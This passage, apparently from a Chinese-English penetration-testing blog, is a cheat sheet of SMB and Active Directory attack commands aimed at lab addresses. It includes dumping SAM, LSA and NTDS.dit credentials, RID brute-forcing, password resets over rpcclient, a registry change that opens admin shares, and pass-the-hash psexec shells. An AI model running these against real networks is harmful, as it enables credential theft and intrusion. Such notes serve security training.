+<h3 id="02-CRACKMAPEXEC"><a href="#02-CRACKMAPEXEC" class="headerlink" title="02.CRACKMAPEXEC"></a>02.CRACKMAPEXEC</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Enumarate hosts</span><br>crackmapexec smb <span class="hljs-number">192.168</span>.<span class="hljs-number">3.201</span><span class="hljs-literal">-203</span><br><br><span class="hljs-comment">## ------------------| Tricks</span><br><span class="hljs-comment">## 默认情况下，Crackmapexec尝试使用域帐户而不是本地用户帐户进行身份验证</span><br><span class="hljs-comment">## 所以使用-d WORKGROUP尝试使用本地用户帐户</span><br><br><span class="hljs-comment">## ------------------| Enumarate shares / Basic info</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.178</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">--shares</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-literal">--shares</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;DoseNotExist&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-literal">--shares</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;DoseNotExist&#x27;</span> <span class="hljs-literal">-H</span> &lt;NThash&gt;<br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-d</span> WORKGROUP <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;DoseNotExist&#x27;</span> <span class="hljs-literal">-H</span> &lt;NThash&gt;<br><br><span class="hljs-comment">## ------------------| 枚举活动会话</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> UserName <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--sessions</span> <br><br><span class="hljs-comment">## ------------------| 枚举磁盘</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> UserName <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--disks</span><br><br><span class="hljs-comment">## ------------------| 枚举登录的用户</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> UserName <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--loggedon-users</span><br><br><span class="hljs-comment">## ------------------| Enumerate domain users</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> UserName <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--users</span><br><br><span class="hljs-comment">## ------------------| 通过破坏RID来枚举用户</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> UserName <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--rid-brute</span><br><br><span class="hljs-comment">## ------------------| Enumerate domain groups</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> UserName <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--groups</span><br><br><span class="hljs-comment">## ------------------| Enumerate local groups</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> UserName <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--local-groups</span><br><br><span class="hljs-comment">## ------------------| 标识SMB签名已禁用</span><br>crackmapexec smb <span class="hljs-literal">--gen-relay-list</span> output.txt <span class="hljs-number">10.10</span>.<span class="hljs-number">10.0</span>/<span class="hljs-number">24</span><br><br><span class="hljs-comment">## ------------------| 枚举密码策略</span><br><span class="hljs-comment">## 如果帐户锁定阈值：无；我们可以粗暴对待</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">--pass-pol</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-literal">--pass-pol</span><br><br><span class="hljs-comment">## ------------------| Dump SAM/LSA/NTDS.dit</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> UserName <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--sam</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> UserName <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--lsa</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> UserName <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--ntds</span> <br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-u</span> UserName <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Password&#x27;</span> <span class="hljs-literal">--ntds</span> vss<br><br><span class="hljs-comment">## ------------------| Execute Commands</span><br><span class="hljs-comment">## PowerShell 5985端口</span><br>crackmapexec winrm <span class="hljs-number">10.10</span>.<span class="hljs-number">10.169</span> <span class="hljs-literal">-u</span> melanie <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Welcome123!&#x27;</span> <span class="hljs-literal">-X</span> <span class="hljs-string">&quot;whoami /all&quot;</span><br><span class="hljs-comment">## CMD</span><br>crackmapexec winrm <span class="hljs-number">10.10</span>.<span class="hljs-number">10.169</span> <span class="hljs-literal">-u</span> melanie <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;Welcome123!&#x27;</span> <span class="hljs-literal">-x</span> <span class="hljs-string">&quot;whoami /all&quot;</span><br><br><span class="hljs-comment">## ------------------| 爬网共享</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.149</span> <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;PassW0rd&#x27;</span> <span class="hljs-literal">-M</span> spider_plus <br></code></pre></td></tr></table></figure>
+
+<h3 id="03-SMBMAP"><a href="#03-SMBMAP" class="headerlink" title="03.SMBMAP"></a>03.SMBMAP</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| List shares</span><br>smbmap <span class="hljs-literal">-H</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.178</span><br>smbmap <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;anonymous&#x27;</span> <span class="hljs-literal">-H</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.134</span><br>smbmap <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;anonymous&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;anonymous&#x27;</span> <span class="hljs-literal">-H</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.134</span><br><br><span class="hljs-comment">## ------------------| 递归列表</span><br>smbmap <span class="hljs-literal">-R</span> directory <span class="hljs-literal">-H</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.100</span><br><br><span class="hljs-comment">## ------------------| Download file</span><br>smbmap <span class="hljs-literal">-R</span> directory <span class="hljs-literal">-H</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.100</span> <span class="hljs-literal">-A</span> filename.txt <span class="hljs-literal">-q</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>smbmap -h</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-literal">-H</span> HOST               IP of host<br><span class="hljs-literal">--host-file</span> FILE      包含主机列表的文件<br><span class="hljs-literal">-u</span> USERNAME           用户名，如果省略，则假定为空会话<br><span class="hljs-literal">-p</span> PASSWORD           密码或NTLM哈希<br><span class="hljs-literal">--prompt</span>              提示输入密码<br><span class="hljs-literal">-s</span> SHARE              指定一个共享（默认C<span class="hljs-variable">$</span>），例如“C<span class="hljs-variable">$</span>”<br><span class="hljs-literal">-d</span> DOMAIN             域名（默认WORKGROUP）<br><span class="hljs-literal">-P</span> PORT               SMB port (default <span class="hljs-number">445</span>)<br><span class="hljs-literal">-v</span>                    返回远程主机的操作系统版本<br><span class="hljs-literal">-x</span> COMMAND            执行命令，例如“ipconfig/all”<br><span class="hljs-literal">-L</span>                    列出指定主机上的所有驱动器（需要ADMIN）<br><span class="hljs-literal">-R</span> [<span class="hljs-type">PATH</span>]             递归列出目录。<br><span class="hljs-literal">-r</span> [<span class="hljs-type">PATH</span>]             列出目录的内容。<br><span class="hljs-literal">-g</span> FILE               以grep友好格式输出到文件，<br><span class="hljs-literal">--dir-only</span>            仅列出目录，提交文件。<br><span class="hljs-literal">--depth</span> DEPTH         遍历目录树到特定深度。<br><span class="hljs-literal">--download</span> PATH       从远程系统下载文件，<br><span class="hljs-literal">--upload</span>              将文件上载到远程系统ex。<br><span class="hljs-literal">--delete</span> PATH         删除远程文件，例如“C<span class="hljs-variable">$</span>\temp\msf.exe”<br><span class="hljs-literal">--skip</span>                跳过删除文件确认提示<br></code></pre></td></tr></table></figure>
+
+<h3 id="04-RPCCLIENT"><a href="#04-RPCCLIENT" class="headerlink" title="04.RPCCLIENT"></a>04.RPCCLIENT</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Login as user</span><br>rpcclient <span class="hljs-literal">-U</span> <span class="hljs-string">&#x27;support&#x27;</span> &lt;IP&gt;<br>rpcclient <span class="hljs-literal">-U</span> <span class="hljs-string">&#x27;Administrator:Password&#x27;</span> &lt;IP&gt;<br><br><span class="hljs-comment">## ------------------| Null auth</span><br>rpcclient <span class="hljs-literal">-U</span> <span class="hljs-string">&#x27;&#x27;</span> &lt;IP&gt;<br><br><span class="hljs-comment">## ------------------| Enumarations</span><br>lookupnames Guest<br>enumdomusers<br>queryuser <span class="hljs-number">0</span>x450<br>enumprinters<br>dsr_getdcname<br>dsr_getdcnameex<br>dsr_getdcnameex2<br>dsr_getsitename<br>enumdata<br>enumdomgroups<br>enumjobs<br>enumports<br>enumprivs<br>getanydcname<br>getdcname<br>lookupsids<br>lsaenumsid &lt;SID&gt;<br>lsaquery<br>netconnenum<br>netdiskenum<br>netfileenum<br>netsessenum<br>netshareenum<br>netshareenumall<br>netsharegetinfo<br>queryuser &lt;USERNAME&gt;<br>srvinfo<br><br><span class="hljs-comment">## ------------------| 更改用户密码</span><br>setuserinfo2 &lt;UserAccount&gt; <span class="hljs-number">23</span> <span class="hljs-string">&#x27;&lt;Password&gt;&#x27;</span><br><br><span class="hljs-comment">## ------------------| 粗暴强迫用户RID</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$</span>(seq <span class="hljs-number">500</span> <span class="hljs-number">1100</span>);<span class="hljs-keyword">do</span> rpcclient <span class="hljs-literal">-N</span> <span class="hljs-literal">-U</span> <span class="hljs-string">&quot;&quot;</span> &lt;IP&gt; <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;queryuser 0x<span class="hljs-variable">$</span>(printf &#x27;%x\n&#x27; <span class="hljs-variable">$i</span>)&quot;</span> | grep <span class="hljs-string">&quot;User Name\|user_rid\|group_rid&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>;done    <br></code></pre></td></tr></table></figure>
+
+<h3 id="05-Samrdump-py​"><a href="#05-Samrdump-py​" class="headerlink" title="05.Samrdump.py​"></a>05.Samrdump.py<strong>​</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 此脚本下载目标系统的用户列表。</span><br>impacket<span class="hljs-literal">-samrdump</span> &lt;IP&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="06-Evil-WinRm"><a href="#06-Evil-WinRm" class="headerlink" title="06.Evil-WinRm"></a>06.Evil-WinRm</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 正常使用 (port 5985)</span><br>evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-u</span> UserName <span class="hljs-literal">-p</span> Password <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.149</span> <br>evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-u</span> svc_backup <span class="hljs-literal">-H</span> <span class="hljs-number">9658</span>d1d1dcd9250115e2205d9f48400d <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span><br><br><span class="hljs-comment">## ------------------| With SSL (port 5986)</span><br>evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-S</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.103</span> <span class="hljs-literal">-c</span> amanda.cer <span class="hljs-literal">-k</span> amanda.key <span class="hljs-literal">-P</span> <span class="hljs-number">5986</span><br>evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-S</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.103</span> <span class="hljs-literal">-c</span> amanda.cer <span class="hljs-literal">-k</span> amanda.key <span class="hljs-literal">-u</span> amanda <span class="hljs-literal">-P</span> <span class="hljs-number">5986</span><br><br><span class="hljs-comment">## 如果获取类似“术语&#x27;Invoke-Expression&#x27;未被识别为cmdlet的名称”的消息</span><br><span class="hljs-comment">## 该语言在远程计算机中受到限制。试试这个！！！</span><br>sudo apt<span class="hljs-literal">-get</span> install gss<span class="hljs-literal">-ntlmssp</span><br>pwsh<br><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;&lt;PassWord&gt;&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;&lt;DOMAIN&gt;\&lt;ACCOUNT_NAME&gt;&#x27;</span>, <span class="hljs-variable">$pass</span>)   <br><span class="hljs-built_in">Enter-PSSession</span> <span class="hljs-literal">--ComputerName</span> &lt;IP&gt; <span class="hljs-literal">-credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-Authentication</span> Negotiate<br></code></pre></td></tr></table></figure>
+
+<h3 id="07-Psexec"><a href="#07-Psexec" class="headerlink" title="07.Psexec"></a>07.Psexec</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 允许访问$ADMIN C$，IP$（Windows管理共享）</span><br>REG add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d <span class="hljs-number">1</span> /f<br><br><span class="hljs-comment">## ------------------| 如果我们对SMB共享进行R&amp;W</span><br>impacket<span class="hljs-literal">-psexec</span> HTB/James:<span class="hljs-string">&#x27;J@m3s_P@ssW0rd!&#x27;</span>@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.52</span><br><br><span class="hljs-comment">## ------------------| 如果您有NTML哈希[PassTheHash]</span><br>impacket<span class="hljs-literal">-psexec</span> Administrator@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <span class="hljs-literal">-hashes</span> &lt;HASH&gt;:&lt;HASH&gt;    <br></code></pre></td></tr></table></figure>
+
+<h2 id="02-活动目录枚举"><a href="#02-活动目录枚举" class="headerlink" title="02.活动目录枚举"></a>02.活动目录枚举</h2><h3 id="00-基本-1"><a href="#00-基本-1" class="headerlink" title="00.基本"></a>00.基本</h3><ul>
+<li>如果您处于AD环境</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 导入AD模块</span><br><span class="hljs-built_in">Get-Module</span> <span class="hljs-literal">-Name</span> ActiveDirectory <span class="hljs-literal">-ListAvailable</span><br><span class="hljs-built_in">Import-Module</span> <span class="hljs-literal">-Name</span> ActiveDirectory<br><br><span class="hljs-comment">## ------------------| 列出所有用户+计算机</span><br><span class="hljs-built_in">Get-ADObject</span> <span class="hljs-literal">-LDAPFilter</span> <span class="hljs-string">&quot;(objectClass=user)&quot;</span><br><span class="hljs-built_in">Get-ADObject</span> <span class="hljs-literal">-LDAPFilter</span> <span class="hljs-string">&quot;(objectCategory=user)&quot;</span><br><span class="hljs-built_in">Get-ADObject</span> <span class="hljs-literal">-LDAPFilter</span> <span class="hljs-string">&quot;(&amp;(!(objectClass=computer)(objectCategory=user)))&quot;</span><br><br><span class="hljs-comment">## ------------------| 列出帐户名称以h开头的所有用户</span><br><span class="hljs-built_in">Get-ADObject</span> <span class="hljs-literal">-LDAPFilter</span> <span class="hljs-string">&quot;(sAMAccountName=j*)&quot;</span><br><span class="hljs-built_in">Get-ADObject</span> <span class="hljs-literal">-LDAPFilter</span> <span class="hljs-string">&quot;(sAMAccountName=j*)&quot;</span> <span class="hljs-literal">-Properties</span> cn,objectSid,description,givenname,sn                     <br><br><span class="hljs-comment">## ------------------| 列出已设置SPN（服务原则名称）的所有用户；获取用户SPns</span><br><span class="hljs-built_in">Get-ADObject</span> <span class="hljs-literal">-LDAPFilter</span> <span class="hljs-string">&quot;(servicePrincipalName=*)&quot;</span><br><span class="hljs-built_in">Get-ADObject</span> <span class="hljs-literal">-LDAPFilter</span> <span class="hljs-string">&quot;(servicePrincipalName=*)&quot;</span> <span class="hljs-literal">-Properties</span> servicePrincipalName<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>Microsoft ActiveDirectory PowerShell <a target="_blank" rel="noopener" href="https://github.com/samratashok/ADModule">AD 模块</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Setup</span><br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/samratashok/ADModule/master/<span class="hljs-built_in">Import-ActiveDirectory</span>.ps1<br><span class="hljs-built_in">wget</span> https://github.com/samratashok/ADModule/raw/master/Microsoft.ActiveDirectory.Management.dll<br><span class="hljs-comment">## 首先，您需要导入dll文件[使用绝对路径或.\Microsoft.ActiveDirectory.Management.dll]</span><br><span class="hljs-built_in">Import-Module</span> C:\Full\Path\Microsoft.ActiveDirectory.Management.dll <span class="hljs-literal">-Verbose</span><br><span class="hljs-comment"># or : Import-ActiveDirectory -ActiveDirectoryModule C:\Full\Path\Microsoft.ActiveDirectory.Management.dll</span><br>. .\<span class="hljs-built_in">Import-ActiveDirectory</span>.ps1<br><span class="hljs-built_in">Get-Command</span> <span class="hljs-literal">-Module</span> ActiveDirectory<br><br><span class="hljs-comment">## ------------------| Basic Doamin Enum</span><br><span class="hljs-built_in">Get-ADDomain</span>                            <span class="hljs-comment"># List current domain</span><br><span class="hljs-built_in">Get-ADDomain</span> <span class="hljs-literal">-Identity</span> &lt;DomainName&gt;     <span class="hljs-comment"># List other domain info</span><br>(<span class="hljs-built_in">Get-ADDomain</span>).DomainSID                <span class="hljs-comment"># List domain SID value</span><br><span class="hljs-built_in">Get-ADDomainController</span>                  <span class="hljs-comment"># 列出域控制器</span><br><span class="hljs-built_in">Get-ADDomainController</span> <span class="hljs-literal">-DomainName</span> &lt;Domain&gt; <span class="hljs-literal">-Discover</span><br><br><span class="hljs-comment">## ------------------| User Enumaration</span><br><span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Properties</span> *<br><span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Identity</span> &lt;UserName&gt; <span class="hljs-literal">-Properties</span> *<br><span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Properties</span> * | <span class="hljs-built_in">select</span> Name<br><span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Properties</span> * | <span class="hljs-built_in">select</span> <span class="hljs-literal">-First</span> <span class="hljs-number">1</span> | <span class="hljs-built_in">Get-Member</span> <span class="hljs-literal">-MemberType</span> *Properties  | <span class="hljs-built_in">select</span> Name <br><span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&#x27;Description -like &quot;*built*&quot;&#x27;</span> <span class="hljs-literal">-Properties</span> Description | <span class="hljs-built_in">select</span> name,Description   <br><br><span class="hljs-comment">## ------------------| Computer Enumaration</span><br><span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-Filter</span> * | <span class="hljs-built_in">select</span> Name<br><span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&#x27;OperatingSystem -like &quot;*Windows*&quot;&#x27;</span> <span class="hljs-literal">-Properties</span> OperatingSystem | <span class="hljs-built_in">select</span> Name,OperatingSystem <br><span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-string">&quot;&lt;ComputerName&gt;&quot;</span> –Properties * | <span class="hljs-built_in">Format-Table</span> OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack      <br><br><span class="hljs-comment">## ------------------| Domain Group Enumaration</span><br><span class="hljs-built_in">Get-ADGroup</span> <span class="hljs-literal">-Filter</span> * | <span class="hljs-built_in">select</span> name<br><span class="hljs-built_in">Get-ADGroup</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Properties</span> *<br><span class="hljs-built_in">Get-ADGroup</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&#x27;Name -like &quot;*admin*&quot;&#x27;</span> | <span class="hljs-built_in">select</span> name<br><span class="hljs-built_in">Get-ADGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-literal">-Recursive</span><br><span class="hljs-built_in">Get-ADPrincipalGroupMembership</span> <span class="hljs-literal">-Identity</span> &lt;UserName&gt;<br><br><span class="hljs-comment">## ------------------| 枚举组织单位[OU]</span><br><span class="hljs-built_in">Get-ADOrganizationalUnit</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Properties</span> * | <span class="hljs-built_in">select</span> name<br><br><span class="hljs-comment">## ------------------| Enumerate ACL</span><br>(<span class="hljs-built_in">Get-Acl</span> <span class="hljs-string">&#x27;AD:\CN=Administrator,CN=Users,DC=&lt;Domain&gt;&#x27;</span>).Access<br>(<span class="hljs-built_in">Get-Acl</span> <span class="hljs-string">&#x27;AD:\CN=Administrator,CN=Users,DC=&lt;Domain&gt;&#x27;</span>).Access | <span class="hljs-built_in">select</span> IdentityReference,ActiveDirectoryRights | <span class="hljs-built_in">fl</span><br><br><span class="hljs-comment">## ------------------| 枚举域信任</span><br><span class="hljs-built_in">Get-ADTrust</span> <span class="hljs-literal">-Filter</span> *<br><span class="hljs-built_in">Get-ADTrust</span> <span class="hljs-literal">-Identity</span> &lt;FQDN&gt;<br><br><span class="hljs-comment">## ------------------| 枚举域林</span><br><span class="hljs-built_in">Get-ADForest</span><br>(<span class="hljs-built_in">Get-ADForest</span>).Domains<br><span class="hljs-built_in">Get-ADForest</span> <span class="hljs-literal">-Identity</span> &lt;FQDN&gt;<br><span class="hljs-built_in">Get-ADForest</span> | <span class="hljs-built_in">select</span> <span class="hljs-literal">-ExpandProperty</span> GlobalCatalogs<br><span class="hljs-built_in">Get-ADTrust</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&#x27;msDS-TrustForestTrustInfo -ne &quot;$null&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
+
